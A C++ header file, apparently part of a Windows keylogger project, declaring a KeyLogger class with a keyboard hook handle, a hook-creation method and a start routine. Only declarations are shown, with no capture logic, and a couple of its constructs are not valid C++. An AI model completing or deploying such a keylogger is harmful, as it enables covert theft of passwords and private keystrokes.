#pragma once
#include "File.hpp"
#include "Logger.hpp"
#include "SystemUtils.hpp"
#include <iostream>

constexpr char* KEYBOARD_HOOK_FUNCTION = "KeyboardHookProc";

const class KeyLogger
{
public:
	static void start();

private:
	HHOOK create_hook();

private:
	HHOOK keyboard_hook;

public:
	explicit KeyLogger();
	~KeyLogger();

private:
	KeyLogger(const KeyLogger&) = delete;
	KeyLogger(KeyLogger&&) = delete;
	KeyLogger& operator=(const KeyLogger&) = delete;
	KeyLogger& operator=(KeyLogger&&) = delete;
};

